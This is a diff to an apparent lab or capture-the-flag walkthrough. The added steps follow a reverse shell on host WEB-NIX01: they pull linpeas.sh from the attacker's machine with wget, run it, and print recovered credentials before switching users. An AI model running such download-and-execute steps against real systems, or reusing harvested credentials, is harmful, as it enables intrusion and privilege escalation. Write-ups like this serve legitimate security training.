@@ -578,4 +578,20 @@ And we get the reverse shell!
 
 <img width="938" height="199" alt="image" src="https://github.com/user-attachments/assets/5fe44af7-0c8a-48a5-acf2-d99daa059ab9" />
 
-14. 
+14. We will do some basic privesc enumeration by transferring over the `linpeas.sh` script. We start a python server on our local machine and use wget to download the script onto WEB-NIX01.
+
+`wget http://[IP]/linpeas.sh`
+
+<img width="621" height="210" alt="image" src="https://github.com/user-attachments/assets/5768eecd-e44e-47de-b12d-82de14a0574b" />
+
+15. We give our user execute permissions over it and run the script.
+
+`chmod u+x linpeas.sh; ./linpeas.sh`
+
+<img width="904" height="253" alt="image" src="https://github.com/user-attachments/assets/8c8543ec-06ba-4c50-8c17-b274605b1b78" />
+
+16. We find the credentials `balthazar:TheJoker12345!`. We switch users to it
+
+<img width="360" height="149" alt="image" src="https://github.com/user-attachments/assets/6b7d8b83-df77-4985-a385-6614b6e89a62" />
+
+17. 
